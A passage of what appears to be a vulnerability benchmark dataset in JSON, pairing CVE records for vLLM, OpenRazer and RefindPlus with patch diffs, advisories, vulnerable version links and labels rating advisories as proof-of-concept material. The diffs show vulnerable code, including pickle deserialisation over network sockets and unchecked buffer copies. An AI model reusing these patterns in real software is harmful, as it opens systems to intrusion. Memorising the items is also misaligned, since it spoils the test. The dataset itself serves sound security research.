self.sender_socket.bind(f\"tcp://{d_host}:{d_rank_offset + 1}\")\n+            self.receiver_ack.bind(f\"tcp://{d_host}:{d_rank_offset + 2}\")\n             self.sender_ack.connect(f\"tcp://{p_host}:{p_rank_offset + 2}\")\n \n     def initialize(self, local_hostname: str, metadata_server: str,\n\n@@ -176,7 +177,7 @@\ndef read_bytes_from_buffer(self, buffer: int, length: int) -> bytes:\n \n     def wait_for_ack(self, src_ptr: int, length: int) -> None:\n         \"\"\"Asynchronously wait for ACK from the receiver.\"\"\"\n-        ack = self.sender_ack.recv_pyobj()\n+        ack = self.sender_ack.recv()\n         if ack != b'ACK':\n             logger.error(\"Failed to receive ACK from the receiver\")\n\n@@ -187,18 +188,22 @@\ndef send_bytes(self, user_data: bytes) -> None:\n         length = len(user_data)\n         src_ptr = self.allocate_managed_buffer(length)\n         self.write_bytes_to_buffer(src_ptr, user_data, length)\n-        self.sender_socket.send_pyobj((src_ptr, length))\n+        self.sender_socket.send_multipart(\n+            [struct.pack(\"!Q\", src_ptr),\n+             struct.pack(\"!Q\", length)])\n         self.buffer_cleaner.submit(self.wait_for_ack, src_ptr, length)\n \n     def recv_bytes(self) -> bytes:\n         \"\"\"Receive bytes from the remote process.\"\"\"\n-        src_ptr, length = self.receiver_socket.recv_pyobj()\n+        data = self.receiver_socket.recv_multipart()\n+        src_ptr = struct.unpack(\"!Q\", data[0])[0]\n+        length = struct.unpack(\"!Q\", data[1])[0]\n         dst_ptr = self.allocate_managed_buffer(length)\n         self.transfer_sync(dst_ptr, src_ptr, length)\n         ret = self.read_bytes_from_buffer(dst_ptr, length)\n \n         # Buffer cleanup\n-        self.receiver_ack.send_pyobj(b'ACK')\n+        self.receiver_ack.send(b'ACK')\n         self.free_managed_buffer(dst_ptr, length)\n \n         return ret\n```",
                "url": "https://github.com/vllm-project/vllm/commit/a5450f11c95847cf51a17207af9a3ca5ab569b2c"
            }
        ],
        "published_date": "2025-04-30T00:25:00.655Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nvllm-project\n/\nvllm\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 7.4k\nStar 47.5k\nCode\nIssues\n1.8k\nPull requests\n644\nDiscussions\nActions\nProjects\n11\nSecurity\n10\nInsights\nAdditional navigation options\nRemote Code Execution via Mooncake Integration\nCritical russellb published GHSA-hj4w-hm2g-p6w5 2 weeks agoApr 29, 2025\nPackage\npip vllm\n(\npip\n)\nAffected versions\n>=0.6.5\nPatched versions\nv0.8.5\nDescription\nImpacted Deployments\nNote that vLLM instances that do NOT make use of the mooncake integration are NOT vulnerable.\nDescription\nvLLM integration with mooncake is vaulnerable to remote code execution due to using pickle based serialization over unsecured ZeroMQ sockets. The vulnerable sockets were set to listen on all network interfaces, increasing the likelihood that an attacker is able to reach the vulnerable ZeroMQ sockets to carry out an attack.\nThis is a similar to GHSA - x3m8 - f7g5 - qhm7, the problem is in\nvllm/vllm/distributed/kv_transfer/kv_pipe/mooncake_pipe.py\nLine 179 in 32b14ba\n ack = self.sender_ack.recv_pyobj() \nHere recv_pyobj() Contains implicit pickle.loads(), which leads to potential RCE.\nFinder is kexoh (Xiangfan Wu) from XingTu Team of Legendsec at QI-ANXIN Group.\nSeverity\nCritical\n10.0\n/ 10\nCVSS v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\nCVE ID\nCVE-2025-32444\nWeaknesses\nNo CWEs\nCredits\nkexinoh\nReporter\nShangmingCai\nRemediation developer\nrussellb\nCoordinator\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The advisory describes the technical details of the vulnerability such as the insecure use of pickle serialization and highlights the code line responsible. However, it does not include exact proof-of-concept or step-by-step instructions for exploitation.",
                "url": "https://github.com/vllm-project/vllm/security/advisories/GHSA-hj4w-hm2g-p6w5"
            },
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nvllm-project\n/\nvllm\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 7.4k\nStar 47.5k\nCode\nIssues\n1.8k\nPull requests\n644\nDiscussions\nActions\nProjects\n11\nSecurity\n10\nInsights\nAdditional navigation options\nRemote Code Execution via Mooncake Integration\nCritical russellb published GHSA-x3m8-f7g5-qhm7 on Mar 19Mar 19, 2025\nPackage\npip vllm\n(\npip\n)\nAffected versions\n>=0.6.5,<0.8.0\nPatched versions\n0.8.0\nDescription\nSummary\nWhen vLLM is configured to use Mooncake, unsafe deserialization exposed directly over ZMQ/TCP will allow attackers to execute remote code on distributed hosts.\nDetails\nPickle deserialization vulnerabilities are well documented.\nThe mooncake pipe is exposed over the network (by design to enable disaggregated prefilling across distributed environments) using ZMQ over TCP, greatly increasing exploitability. Only sender_socket and receiver_ack are allowed to be accessed publicly, while the data actually decompressed by pickle.loads() comes from recv_bytes. Its interface is defined as self.receiver_socket.connect(f\\\"tcp://{d_host}:{d_rank_offset + 1}\\\"), where d_host is decode_host, a locally defined address 192.168.0.139,from mooncake.json (https://github.com/kvcache-ai/Mooncake/blob/main/doc/en/vllm-integration-v0.2.md?plain=1#L36).\nThe root problem is recv_tensor() calls _recv_impl which passes the raw network bytes to pickle.loads(). Additionally, it does not appear that there are any controls (network, authentication, etc) to prevent arbitrary users from sending this payload to the affected service.\nImpact\nThis is a remote code execution vulnerability impacting any deployments using Mooncake to distribute KV across distributed hosts.\nRemediation\nThis issue is resolved by #14228\nSeverity\nCritical\n9.1\n/ 10\nCVSS v3 base metrics\nAttack vector\nAdjacent\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nLearn more about base metrics\nCVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H\nCVE ID\nCVE-2025-29783\nWeaknesses\nCWE-502\nCredits\nJosephTLucas\nReporter\nrussellb\nCoordinator\nkexinoh\nOther\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory includes sufficient technical details about the vulnerability, such as the exposed interface and the improper use of deserialization, that can serve as a proof of concept.",
                "url": "https://github.com/vllm-project/vllm/security/advisories/GHSA-x3m8-f7g5-qhm7"
            }
        ],
        "sw_version": "v0.6.5",
        "sw_version_wget": "https://github.com/vllm-project/vllm/archive/refs/tags/v0.6.5.zip"
    },
    "CVE-2025-32776": {
        "cwe": [
            {
                "id": "CWE-125",
                "value": "CWE-125: Out-of-bounds Read"
            }
        ],
        "description": "OpenRazer is an open source driver and user-space daemon to control Razer device lighting and other features on GNU/Linux. By writing specially crafted data to the `matrix_custom_frame` file, an attacker can cause the custom kernel driver to read more bytes than provided by user space. This data will be written into the RGB arguments which will be sent to the USB device. This issue has been patched in v3.10.2.",
        "languages": [
            "C",
            "Python"
        ],
        "patch_commits": [
            {
                "content": "driver: Stop copying any custom frame data when parameters are invalid\n\nWhile the initial idea of this check was to sanitize any a row_length\nvalue which is too high. But in reality we should just essentially error\nout (which due to the function signature we can't do properly), and stop\ntrying to memcpy any data.\n\nIssue: https://github.com/openrazer/openrazer/issues/2433\n\nFilename: driver/razerchromacommon.c:\n```\n@@ -455,7 +455,7 @@\nstruct razer_report razer_chroma_standard_matrix_set_custom_frame(unsigned char\n \n     if (row_length > sizeof(report.arguments) - start_arg_offset) {\n         printk(KERN_ALERT \"razerchroma: RGB data too long\\n\");\n-        row_length = sizeof(report.arguments) - start_arg_offset;\n+        row_length = 0;\n     }\n \n     report = get_razer_report(0x03, 0x0B, 0x46); // In theory should be able to leave data size at max as we have start/stop\n\n@@ -757,7 +757,7 @@\nstruct razer_report razer_chroma_extended_matrix_set_custom_frame2(unsigned char\n \n     if (row_length > sizeof(report.arguments) - start_arg_offset) {\n         printk(KERN_ALERT \"razerchroma: RGB data too long\\n\");\n-        row_length = sizeof(report.arguments) - start_arg_offset;\n+        row_length = 0;\n     }\n \n     // Some devices need a specific packet length, most devices are happy with 0x47\n\n@@ -1024,7 +1024,7 @@\nstruct razer_report razer_chroma_misc_one_row_set_custom_frame(unsigned char sta\n \n     if (row_length > sizeof(report.arguments) - start_arg_offset) {\n         printk(KERN_ALERT \"razerchroma: RGB data too long\\n\");\n-        row_length = sizeof(report.arguments) - start_arg_offset;\n+        row_length = 0;\n     }\n \n     report.arguments[0] = start_col;\n```",
                "url": "https://github.com/openrazer/openrazer/commit/57610511d2548eda66999eaed5aa4517e89d6d39"
            },
            {
                "content": "driver: Fix possible integer overflow in write_matrix_custom_frame\n\nWhen a user passes start_col=0x00 and stop_col=0x55 with the data,\nrow_length can easily wrap around leading to undesired behavior\nincluding out of bounds read while copying data into report.arguments.\n\nAvoid the overflow by making sure the underlying type has enough space\nfor the value ((255 + 1) - 0) * 3 = 768.\n\nIssue: https://github.com/openrazer/openrazer/issues/2433\n\nFilename: driver/razeraccessory_driver.c:\n```\n@@ -872,7 +872,7 @@\nstatic ssize_t razer_attr_write_matrix_custom_frame(struct device *dev, struct d\n     unsigned char row_id;\n     unsigned char start_col;\n     unsigned char stop_col;\n-    unsigned char row_length;\n+    size_t row_length;\n \n     //printk(KERN_ALERT \"razermyg: Total count: %d\\n\", (unsigned char)count);\n```\n\nFilename: driver/razerkbd_driver.c:\n```\n@@ -3043,7 +3043,7 @@\nstatic ssize_t razer_attr_write_matrix_custom_frame(struct device *dev, struct d\n     unsigned char row_id;\n     unsigned char start_col;\n     unsigned char stop_col;\n-    unsigned char row_length;\n+    size_t row_length;\n     bool want_response = true;\n \n     //printk(KERN_ALERT \"razerkbd: Total count: %d\\n\", (unsigned char)count);\n```\n\nFilename: driver/razermouse_driver.c:\n```\n@@ -2755,7 +2755,7 @@\nstatic ssize_t razer_attr_write_matrix_custom_frame(struct device *dev, struct d\n     unsigned char row_id;\n     unsigned char start_col;\n     unsigned char stop_col;\n-    unsigned char row_length;\n+    size_t row_length;\n \n     //printk(KERN_ALERT \"razermouse: Total count: %d\\n\", (unsigned char)count);\n```",
                "url": "https://github.com/openrazer/openrazer/commit/d869abd20995b4931795e1cde54d4ac84d9ca62f"
            }
        ],
        "published_date": "2025-04-15T16:32:20.628Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nopenrazer\n/\nopenrazer\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 561\nStar 3.9k\nCode\nIssues\n175\nPull requests\n32\nActions\nWiki\nSecurity\n2\nInsights\nAdditional navigation options\nOut of Bounds Read in matrix_custom_frame\nModerate z3ntu published GHSA-835j-6976-46jx on Apr 12Apr 12, 2025\nPackage\nOpenRazer\nAffected versions\n<= v3.10.1\nPatched versions\nv3.10.2\nDescription\nImpact\nBy writing specially crafted data to the matrix_custom_frame file, an attacker can cause the custom kernel driver to read more bytes than provided by user space. This data will be written into the RGB arguments which will be sent to the USB device.\nPatches\nThe issue has been patched in v3.10.2.\nWorkarounds\nNone.\nReferences\n#2433\nSeverity\nModerate\n5.5\n/ 10\nCVSS v3 base metrics\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nLearn more about base metrics\nCVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N\nCVE ID\nCVE-2025-32776\nWeaknesses\nCWE-125\nCredits\nDiRaltvein\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The provided advisory describes the vulnerability and its impact but does not include a proof of concept or detailed steps to reproduce.",
                "url": "https://github.com/openrazer/openrazer/security/advisories/GHSA-835j-6976-46jx"
            }
        ],
        "sw_version": "v3.10.1",
        "sw_version_wget": "https://github.com/openrazer/openrazer/archive/refs/tags/v3.10.1.zip"
    },
    "CVE-2025-4002": {
        "cwe": [
            {
                "id": "CWE-476",
                "value": "NULL Pointer Dereference"
            },
            {
                "id": "CWE-404",
                "value": "Denial of Service"
            }
        ],
        "description": "A vulnerability was found in RefindPlusRepo RefindPlus 0.14.2.AB and classified as problematic. Affected by this issue is the function GetDebugLogFile of the file Library/MemLogLib/BootLog.c. The manipulation leads to null pointer dereference. Attacking locally is a requirement. The patch is identified as d2143a1e2deefddd9b105fb7160763c4f8d47ea2. It is recommended to apply a patch to fix this issue.",
        "languages": [
            "C"
        ],
        "patch_commits": [
            {
                "content": "Fix Potential NULL Pointer Dereference (#205)\n\nFilename: Library/MemLogLib/BootLog.c:\n```\n@@ -184,16 +184,25 @@\nEFI_FILE_PROTOCOL * GetDebugLogFile (VOID) {\n     //\n     // Get mRootDir from the device we are loaded from\n     mRootDir = EfiLibOpenRoot (LoadedImage->DeviceHandle);\n-\n     LogProtocol = OpenLogFile();\n-    Status = REFIT_CALL_1_WRAPPER(mRootDir->Close, mRootDir);\n+    if (mRootDir == NULL) {\n+        Status = EFI_NOT_READY;\n+    }\n+    else {\n+        Status = REFIT_CALL_1_WRAPPER(mRootDir->Close, mRootDir);\n+    }\n     if (EFI_ERROR(Status)) {\n         // Try on first EFI partition\n         mRootDir = NULL;\n         Status = egFindESP (&mRootDir);\n         if (!EFI_ERROR(Status)) {\n             LogProtocol = OpenLogFile();\n-            Status = REFIT_CALL_1_WRAPPER(mRootDir->Close, mRootDir);\n+            if (mRootDir == NULL) {\n+                Status = EFI_NOT_READY;\n+            }\n+            else {\n+                Status = REFIT_CALL_1_WRAPPER(mRootDir->Close, mRootDir);\n+            }\n         }\n \n         if (EFI_ERROR(Status)) {\n```",
                "url": "https://github.com/RefindPlusRepo/RefindPlus/commit/d2143a1e2deefddd9b105fb7160763c4f8d47ea2"
            }
        ],
        "published_date": "2025-04-28T05:00:07.032Z",
        "sec_adv": [],
        "sw_version": "v0.14.2.AB",
        "sw_version_wget": "https://github.com/RefindPlusRepo/RefindPlus/archive/refs/tags/v0.14.2.AB.zip"
    },
    "CVE-2025-4003": {
        "cwe": [
            {
                "id": "CWE-476",
                "value": "NULL Pointer Dereference"
            },
            {
                "id": "CWE-404",
                "value": "Denial of Service"
            }
        ],
        "description": "A vulnerability was found in RefindPlusRepo RefindPlus 0.14.2.AB. It has been classified as problematic. This affects the function InternalApfsTranslateBlock of the file Library/RP_ApfsLib/RP_ApfsIo.c. The manipulation leads to null pointer dereference. It is possible to launch the attack on the local host. The patch is named 4d35125ca689a255647e9033dd60c257d26df7cb. It is recommended to apply a patch to fix this issue.",
        "languages": [
            "C"
        ],
        "patch_commits": [
            {
                "content": "Housekeeping\n\nFilename: .github/ISSUE_TEMPLATE/bug_report.yml:\n```\n@@ -3,11 +3,16 @@\ndescription: Report a problem with RefindPlus\n body:\n   - type: markdown\n     attributes:\n-      value: |\n+      value: |-\n         Thank you for taking the time to report a problem with RefindPlus.\n-        Please use the [DISCUSSIONS OPTION](https://github.com/dakanji/RefindPlus/discussions) instead if you wish to ask a question, make a comment or similar.\n+        Please use the [DISCUSSIONS OPTION](https://github.com/RefindPlusRepos/RefindPlus/discussions/categories/general) instead if you wish to ask a question, make a comment or similar.\n \n-        NB: Before continuing, try running RefindPlus with the 'ransom_drives' configuration option set if the problem is that RefindPlus hangs on UEFI-PC with HP firmware.\n+        ## BEFORE YOU PROCEED\n+\n+        If the problem is that RefindPlus hangs on Hewlett Parkard (HP) firmware, try to following steps first:\n+        - Run RefindPlus with the 'ransom_drives' configuration setting active and the 'disable_rescan_dxe' setting inactive.\n+        - Run RefindPlus with the 'disable_rescan_dxe' configuration setting active and the 'ransom_drives' setting inactive if that fails.\n+        - Run RefindPlus with both the 'ransom_drives' and 'disable_rescan_dxe' settings active if that fails.\n   - type: dropdown\n     id: version\n     attributes:\n\n@@ -77,9 +82,9 @@\nbody:\n     id: log-file\n     attributes:\n       label: Debug Log\n-      description: |\n-        Please run the RefindPlus 'DBG' efi and add debug logs.\n-        Please attach log files and do not paste their contents.\n+      description: |-\n+        Please run the RefindPlus 'DBG' efi and add debug logs.\\\n+        Please attach log files and *DO NOT* paste their contents.\\\n         Attach log files by dragging/dropping on the field below.\n       placeholder: |\n         Reports that do not need log files are typically best as Discussions.\n\n@@ -90,7 +95,7 @@\nbody:\n     id: extra-info\n     attributes:\n       label: Additional Context\n-      description: |\n+      description: |-\n         Additional details that may further make the problem clear.\n       placeholder: |\n         You can attach files by dragging/dropping them on this field.\n```\n\nFilename: .github/ISSUE_TEMPLATE/config.yml:\n```\n@@ -1,5 +1,5 @@\nblank_issues_enabled: false\n contact_links:\n   - name: RefindPlus Discussions\n-    url: https://github.com/dakanji/RefindPlus/discussions\n+    url: https://github.com/RefindPlusRepos/RefindPlus/discussions/categories/general\n     about: General Queries, Comments and/or Discussion\n```\n\nFilename: .github/ISSUE_TEMPLATE/feature-request.yml:\n```\n@@ -5,7 +5,7 @@\nbody:\n     attributes:\n       value: |\n         Thank you for taking the time to suggest improvements to RefindPlus.\n-        Please use the [DISCUSSIONS OPTION](https://github.com/dakanji/RefindPlus/discussions) instead if you wish to ask a question, make a comment or similar.\n+        Please use the [DISCUSSIONS OPTION](https://github.com/RefindPlusRepos/RefindPlus/discussions/categories/general) instead if you wish to ask a question, make a comment or similar.\n   - type: textarea\n     id: suggested-feature\n     attributes:\n```\n\nFilename: .github/label-config.yml:\n```\n@@ -30,6 +30,9 @@\nAcknowledged:\n # The `Accepted` label is added to issues\n Accepted:\n   issues:\n+    # Add labels\n+    label:\n+      - 'Unresolved'\n     # Remove labels\n     unlabel:\n       - 'Acknowledged'\n\n@@ -53,7 +56,7 @@\nAccepted:\n     reopen: true\n     unlock: true\n \n-# The `Declined` label is added to Pull Requests\n+# The `Declined` label is added to PRs\n Declined:\n   prs:\n     # Remove labels\n\n@@ -80,6 +83,13 @@\nDeclined:\n     # Closure reason\n     close-reason: 'not planned'\n \n+# The `Declined` label is removed from PRs\n+-Declined:\n+  prs:\n+    # Reopen PR and unlock thread\n+    reopen: true\n+    unlock: true\n+\n # The `Uncertain` label is added to issues\n Uncertain:\n   issues:\n```\n\nFilename: .github/workflows/build_artefacts.yml:\n```\n@@ -1,12 +1,11 @@\n-name: Build and Upload Artefacts\n+name: Build Artefacts\n \n on:\n   workflow_dispatch:\n     inputs:\n       commit_id:\n-        description: \"Commit ID (leave blank for GOPFix latest)\"\n+        description: \"Commit ID (Blank for GOPFix Latest)\"\n         required: false\n-        type: number\n \n jobs:\n   build-macos:\n\n@@ -76,34 +75,34 @@\njobs:\n           chmod +x RefindPlusBuilder.sh\n           sh RefindPlusBuilder.sh \"${BRANCH}\" ALL\n \n-      - name: Archive RELEASE Build Artefacts\n+      - name: Archive Build Artefacts (RELEASE)\n         if: success()\n         uses: actions/upload-artifact@v4\n         with:\n-          name: RefindPlus_Artefacts_REL\n-          path: ~/Documents/RefindPlus/edk2/Build/RefindPlus/RELEASE_XCODE5\n+          name: x64_RefindPlus-Artefacts_REL\n+          path: ~/Documents/RefindPlus/edk2/Build/RefindPlus/RELEASE_XCODE5/x64/*.efi\n           if-no-files-found: warn\n           compression-level: 6\n           overwrite: false\n           include-hidden-files: false\n \n-      - name: Archive DEBUG Build Artefacts\n+      - name: Archive Build Artefacts (DEBUG)\n         if: success()\n         uses: actions/upload-artifact@v4\n         with:\n-          name: RefindPlus_Artefacts_DBG\n-          path: ~/Documents/RefindPlus/edk2/Build/RefindPlus/DEBUG_XCODE5\n+          name: x64_RefindPlus-Artefacts_DBG\n+          path: ~/Documents/RefindPlus/edk2/Build/RefindPlus/DEBUG_XCODE5/x64/*.efi\n           if-no-files-found: warn\n           compression-level: 6\n           overwrite: false\n           include-hidden-files: false\n \n-      - name: Archive NOOPT Build Artefacts\n+      - name: Archive Build Artefacts (NOOPT)\n         if: success()\n         uses: actions/upload-artifact@v4\n         with:\n-          name: RefindPlus_Artefacts_NPT\n-          path: ~/Documents/RefindPlus/edk2/Build/RefindPlus/NOOPT_XCODE5\n+          name: x64_RefindPlus-Artefacts_NPT\n+          path: ~/Documents/RefindPlus/edk2/Build/RefindPlus/NOOPT_XCODE5/x64/*.efi\n           if-no-files-found: warn\n           compression-level: 6\n           overwrite: false\n```\n\nFilename: .github/workflows/issue_helper_access.yml:\n```\n@@ -109,7 +109,7 @@\njobs:\n           body: |\n             This thread is being locked.\n \n-            Please use the [Discussions Feature](https://github.com/dakanji/RefindPlus/discussions) for follow-on discussion or raise a new issue if appropriate.\n+            Please use the [Discussions Feature](https://github.com/RefindPlusRepos/RefindPlus/discussions/categories/general) for follow-on discussion or raise a new issue if appropriate.\n \n   issue_close_lock4:\n     name: Issue - CloseLock4\n\n@@ -204,7 +204,7 @@\njobs:\n           body: |\n             This thread is being locked.\n \n-            Please use the [Discussions Feature](https://github.com/dakanji/RefindPlus/discussions) for follow-on discussion or raise a new issue if appropriate.\n+            Please use the [Discussions Feature](https://github.com/RefindPlusRepos/RefindPlus/discussions/categories/general) for follow-on discussion or raise a new issue if appropriate.\n \n   issue_thread_lock3:\n     name: Issue - Thread - Lock3\n```\n\nFilename: .github/workflows/issue_helper_label_add.yml:\n```\n@@ -18,6 +18,7 @@\non:\n         - 'Label - Add - Parked'\n         - 'Label - Add - Prorogued'\n         - 'Label - Add - Resolved'\n+        - 'Label - Add - Unresolved'\n         - 'Label - Add - Tagged'\n         - 'Label - Add - Queries'\n         - 'Label - Add - Upstream'\n\n@@ -378,6 +379,19 @@\njobs:\n           issue-number: ${{ github.event.inputs.item_id }}\n           labels: 'Resolved'\n \n+  label_add_unresolved:\n+    name: Label - Add - Unresolved\n+    runs-on: ubuntu-24.04\n+\n+    if: github.event.inputs.operation == 'Label - Add - Unresolved'\n+    steps:\n+      - uses: actions-cool/issues-helper@v3\n+        with:\n+          actions: 'add-labels'\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          issue-number: ${{ github.event.inputs.item_id }}\n+          labels: 'Unresolved'\n+\n   label_add_tagged:\n     name: Label - Add - Tagged\n     runs-on: ubuntu-24.04\n```\n\nFilename: .github/workflows/issue_helper_label_remove.yml:\n```\n@@ -10,6 +10,7 @@\non:\n         - 'Label - Remove - Abandoned'\n         - 'Label - Remove - Cancelled'\n         - 'Label - Remove - Cannot-Replicate'\n+        - 'Label - Remove - Declined'\n         - 'Label - Remove - Duplicate'\n         - 'Label - Remove - Incomplete'\n         - 'Label - Remove - Invalid'\n\n@@ -73,6 +74,19 @@\njobs:\n           issue-number: ${{ github.event.inputs.item_id }}\n           labels: 'Cannot-Replicate'\n \n+  label_remove_declined:\n+    name: Label - Remove - Declined\n+    runs-on: ubuntu-24.04\n+\n+    if: github.event.inputs.operation == 'Label - Remove - Duplicate'\n+    steps:\n+      - uses: actions-cool/issues-helper@v3\n+        with:\n+          actions: 'remove-labels'\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          issue-number: ${{ github.event.inputs.item_id }}\n+          labels: 'Declined'\n+\n   label_remove_duplicate:\n     name: Label - Remove - Duplicate\n     runs-on: ubuntu-24.04\n```\n\nFilename: .github/workflows/issue_helper_resolve_base_bug.yml:\n```\n@@ -95,11 +95,10 @@\njobs:\n           actions: 'create-comment'\n           token: ${{ secrets.GITHUB_TOKEN }}\n           issue-number: ${{ github.event.inputs.item_id }}\n-          body: |\n-            This item was addressed by Commit ${{ github.event.inputs.commit_ref }}.\n-\n-            The current RefindPlus release is **${{ steps.part_2_2a.outputs.tag }}**.\n-            See [BUILDING.md](https://github.com/dakanji/RefindPlus/blob/GOPFix/BUILDING.md) for how to access functionality ahead of releases.\n+          body: |-\n+            This item was addressed by Commit ${{ github.event.inputs.commit_ref }} towards the next RefindPlus release.\\\n+            The current release version is **${{ steps.part_2_2a.outputs.tag }}**.\\\n+            See [BUILDING.md](https://github.com/RefindPlusRepos/RefindPlus/blob/GOPFix/BUILDING.md) for how to access functionality ahead of releases.\n \n             > [!NOTE]\n             > ${{ github.event.inputs.more_info }}\n\n@@ -114,10 +113,9 @@\njobs:\n           token: ${{ secrets.GITHUB_TOKEN }}\n           issue-number: ${{ github.event.inputs.item_id }}\n           body: |\n-            This item was addressed by Commit ${{ github.event.inputs.commit_ref }}.\n-\n-            The current RefindPlus release is **${{ steps.part_2_2a.outputs.tag }}**.\n-            See [BUILDING.md](https://github.com/dakanji/RefindPlus/blob/GOPFix/BUILDING.md) for how to access functionality ahead of releases.\n+            This item was addressed by Commit ${{ github.event.inputs.commit_ref }} towards the next RefindPlus release.\\\n+            The current release version is **${{ steps.part_2_2a.outputs.tag }}**.\\\n+            See [BUILDING.md](https://github.com/RefindPlusRepos/RefindPlus/blob/GOPFix/BUILDING.md) for how to access functionality ahead of releases.\n \n             > [!CAUTION]\n             > ${{ github.event.inputs.more_info }}\n\n@@ -132,10 +130,9 @@\njobs:\n           token: ${{ secrets.GITHUB_TOKEN }}\n           issue-number: ${{ github.event.inputs.item_id }}\n           body: |\n-            This item was addressed by Commit ${{ github.event.inputs.commit_ref }}.\n-\n-            The current RefindPlus release is **${{ steps.part_2_2a.outputs.tag }}**.\n-            See [BUILDING.md](https://github.com/dakanji/RefindPlus/blob/GOPFix/BUILDING.md) for how to access functionality ahead of releases.\n+            This item was addressed by Commit ${{ github.event.inputs.commit_ref }} towards the next RefindPlus release.\\\n+            The current release version is **${{ steps.part_2_2a.outputs.tag }}**.\\\n+            See [BUILDING.md](https://github.com/RefindPlusRepos/RefindPlus/blob/GOPFix/BUILDING.md) for how to access functionality ahead of releases.\n \n             Thank you for taking the time to report a problem with RefindPlus.\n\n@@ -147,7 +144,7 @@\njobs:\n           token: ${{ secrets.GITHUB_TOKEN }}\n           issue-number: ${{ github.event.inputs.item_id }}\n           body: |\n-            This item was addressed by Commit ${{ github.event.inputs.commit_ref }}.\n+            This item was addressed by Commit ${{ github.event.inputs.commit_ref }} towards the next RefindPlus release.\n \n             > [!NOTE]\n             > ${{ github.event.inputs.more_info }}\n\n@@ -162,7 +159,7 @@\njobs:\n           token: ${{ secrets.GITHUB_TOKEN }}\n           issue-number: ${{ github.event.inputs.item_id }}\n           body: |\n-            This item was addressed by Commit ${{ github.event.inputs.commit_ref }}.\n+            This item was addressed by Commit ${{ github.event.inputs.commit_ref }} towards the next RefindPlus release.\n \n             > [!CAUTION]\n             > ${{ github.event.inputs.more_info }}\n\n@@ -177,7 +174,7 @@\njobs:\n           token: ${{ secrets.GITHUB_TOKEN }}\n           issue-number: ${{ github.event.inputs.item_id }}\n           body: |\n-            This item was addressed by Commit ${{ github.event.inputs.commit_ref }}.\n+            This item was addressed by Commit ${{ github.event.inputs.commit_ref }} towards the next RefindPlus release.\n \n             Thank you for taking the time to report a problem with RefindPlus.\n```\n\nFilename: .github/workflows/issue_helper_resolve_base_enhance.yml:\n```\n@@ -0,0 +1,226 @@\n+name: 'Issue Helper Resolve Enhance'\n+\n+on:\n+  workflow_dispatch:\n+    inputs:\n+      item_id:\n+        description: 'Item ID'\n+        required: true\n+      commit_ref:\n+        description: 'Commit Ref'\n+        required: true\n+      show_build_msg:\n+        type: choice\n+        description: 'Version Comment'\n+        options:\n+        - 'Yes'\n+        - 'No'\n+      more_info:\n+        description: 'More Info'\n+      show_more_info:\n+        type: choice\n+        description: 'Show More Info Entry'\n+        options:\n+        - 'No'\n+        - 'Yes'\n+      type_more_info:\n+        type: choice\n+        description: 'More Info Type'\n+        options:\n+        - 'Note'\n+        - 'Caution'\n+\n+permissions:\n+  issues: write\n+\n+concurrency:\n+  group: lock\n+\n+jobs:\n+\n+  issue_resolve_enhance1:\n+    name: Issue - Resolve - Enhance1\n+    runs-on: ubuntu-24.04\n+\n+    steps:\n+      - id: issue-get-state\n+        uses: actions/github-script@v7\n+        with:\n+          github-token: ${{ secrets.GITHUB_TOKEN }}\n+          script: |\n+            const { data } = await github.rest.issues.get({\n+              owner: context.repo.owner,\n+              repo: context.repo.repo,\n+              issue_number: context.payload.inputs.item_id\n+            });\n+            if (data.locked) {\n+              console.log(\"::set-output name=islocked::true\");\n+            } else {\n+              console.log(\"::set-output name=islocked::false\");\n+            }\n+            if (data.state === 'closed') {\n+              console.log(\"::set-output name=isclosed::true\");\n+            } else {\n+              console.log(\"::set-output name=isclosed::false\");\n+            }\n+\n+  # Misc Issue Items - https://github.com/actions-cool/issues-helper\n+  issue_resolve_enhance2:\n+    name: Issue - Resolve - Enhance2\n+    needs: [issue_resolve_enhance1]\n+    runs-on: ubuntu-24.04\n+\n+    if: ${{ success() || failure() }}\n+    steps:\n+      - if: ${{ steps.issue-get-state.outputs.islocked == 'true' }}\n+        id: part_2_1\n+        uses: actions-cool/issues-helper@v3\n+        with:\n+          actions: 'unlock-issue'\n+          token: ${{ secrets.GITHUB_TOKEN }}\n+          issue-number: ${{ github.event.inputs.item_id }}\n+\n+      - if: ${{ github.event.inputs.show_build_msg == 'Yes' }}\n+        id: part_2_2a\n+        uses: 